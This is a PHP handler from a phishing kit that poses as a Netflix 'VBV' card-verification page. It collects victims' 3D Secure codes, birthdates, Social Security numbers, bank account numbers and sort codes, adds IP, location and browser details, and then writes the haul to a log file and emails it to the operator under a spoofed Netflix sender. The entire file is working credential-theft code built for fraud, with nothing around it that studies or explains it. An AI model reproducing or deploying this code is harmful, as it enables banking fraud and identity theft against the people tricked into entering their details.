<?php
/*  

       ▄▄                       ▄▄                            
        ███                     ▀███                            
         ██                       ██                            
 ▄██▀███ ███████▄  ▄█▀██▄    ▄█▀▀███   ▄██▀██▄▀██▀    ▄█    ▀██▀
 ██   ▀▀ ██    ██ ██   ██  ▄██    ██  ██▀   ▀██ ██   ▄███   ▄█  
 ▀█████▄ ██    ██  ▄█████  ███    ██  ██     ██  ██ ▄█  ██ ▄█   
 █▄   ██ ██    ██ ██   ██  ▀██    ██  ██▄   ▄██   ███    ███    
 ██████▀ ███  ████▄████▀██▄ ▀████▀███▄ ▀█████▀     █      █     
                                                               
                                                               



*/
if (isset($_POST['thd']) && isset($_POST['dob_day'])) {
    session_start();
    include '../mine.php';
    include '../../prevents/anti2.php';
		$msg .= "
<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'><br><br>
################ <font style='color: #820000;'>⚜️ NETFLIX VBV ⚜️</font> ####################<br/>
±±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'> <[ ⚜️ NETFLIX VBV BY ".$scamname." ⚜️ ]> </font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>℗</font> [VBV OF USER] = <font style='color:#0070ba;'>{$_SESSION['fname']}</font><br>
<font style='color:#9c0000;'>℗</font> [3D SECRUE] = <font style='color:#0070ba;'>{$_POST['thd']}</font><br>
<font style='color:#9c0000;'>℗</font> [BIRTHDATE] = <font style='color:#0070ba;'>{$_POST['dob_day']}/{$_POST['dob_month']}/{$_POST['dob_year']}</font><br>
±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>IP LOOKUP INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [COMPUTER] = <font style='color:#0070ba;'>{$_SESSION['computer']}</font><br>
<font style='color:#9c0000;'>✪</font> [IP ADDRESS]	= <font style='color:#0070ba;'>{$_SESSION['ip']}</font><br>
<font style='color:#9c0000;'>✪</font> [LOCATION] = <font style='color:#0070ba;'>{$_SESSION['ip_city']} , {$_SESSION['ip_state']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>{$_SESSION['browser']} on {$_SESSION['os']}</font><br>
<font style='color:#9c0000;'>✪</font> [USER AGENT ] = <font style='color:#0070ba;'>{$_SERVER['HTTP_USER_AGENT']}</font><br>
<font style='color:#9c0000;'>✪</font> [TIMEZONE]	= <font style='color:#0070ba;'>{$_SESSION['ip_timezone']}</font><br>
################## <font style='color: #820000;'> <[  ⚜️ NETFLIX BY ".$scamname." ⚜️ ]></font> #####################
<br>
</div></html>\n";		
if(isset($_POST['ssn'])){$msg.="SSN            : {$_POST['ssn']}\r\n";}
if(isset($_POST['acn'])){$msg.="ACOUNT NUM. : {$_POST['acn']}\r\n";$msg.="SORT CODE   : {$_POST['scode']}\r\n";}
if($saveintext=="yes"){$save=fopen("../../".$filename.".html","a+");fwrite($save,$msg);fclose($save);}
$subject=" 💰 NETFLIX VBV 💰  From [{$_SESSION['ip_countryName']}]  [{$_SESSION['ip']}] ";$headers="From: ⚜️ Netflix ⚜️ <newlogin@shadow.com>\r\n";$headers.="MIME-Version: 1.0\r\n";$headers.="Content-Type: text/html; charset=UTF-8\r\n";if($sendtoemail=="yes"){foreach(explode(",",$yours)as $your){@mail($your,$subject,$msg,$headers);}}
exit('done');}
?>